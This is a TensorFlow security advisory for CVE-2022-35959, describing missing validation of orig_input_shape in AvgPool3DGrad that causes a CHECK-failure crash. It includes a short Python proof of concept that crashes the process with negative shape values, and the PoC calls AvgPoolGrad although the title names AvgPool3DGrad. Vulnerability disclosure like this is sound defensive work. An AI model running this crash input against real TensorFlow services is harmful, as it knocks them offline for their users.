## TFSA-2022-094: `CHECK` failures in `AvgPool3DGrad`

### CVE Number
CVE-2022-35959

### Impact
The implementation of `AvgPool3DGradOp` does not fully validate the input `orig_input_shape`. This results in an overflow that results in a  `CHECK` failure which can be used to trigger a denial of service attack:
```python
import tensorflow as tf

ksize = [1, 2, 2, 1]
strides = [1, 2, 2, 1]
padding = "VALID"
data_format = "NHWC"
orig_input_shape = tf.constant(-536870912, shape=[4], dtype=tf.int32)
grad = tf.constant(.0890338004362538, shape=[1,5,7,1], dtype=tf.float64)
tf.raw_ops.AvgPoolGrad(orig_input_shape=orig_input_shape, grad=grad, ksize=ksize, strides=strides, padding=padding, data_format=data_format)
```

### Patches
We have patched the issue in GitHub commit [9178ac9d6389bdc54638ab913ea0e419234d14eb](https://github.com/tensorflow/tensorflow/commit/9178ac9d6389bdc54638ab913ea0e419234d14eb).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.
